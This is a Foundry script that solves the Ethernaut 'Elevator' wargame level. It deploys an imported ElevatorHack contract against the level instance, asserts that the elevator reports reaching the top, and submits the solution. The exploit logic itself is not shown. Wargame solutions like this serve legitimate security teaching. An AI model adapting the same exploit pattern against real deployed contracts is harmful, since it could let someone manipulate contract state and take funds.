// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {console} from "lib/forge-std/src/Script.sol";
import {EthernautScript} from "./Ethernaut.s.sol";
import {ElevatorHack} from "../src/11_Elevator/ElevatorHack.sol";

interface Instance {
    function goTo(uint) external;

    function top() external view returns (bool);

    function floor() external view returns (uint);
}

contract LevelScript is EthernautScript {
    address level = 0x4A151908Da311601D967a6fB9f8cFa5A3E88a251;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.startBroadcast(key);
        vm.deal(player, 100 ether);
        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function hack() internal {
        ElevatorHack elevatorHack = new ElevatorHack(
            payable(address(instance))
        );
        elevatorHack.hack();
        require(instance.top() == true);
        require(instance.floor() == 1);
    }

    function run() public {
        hack();
        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
// forge script ./script/11_Elevator.s.sol
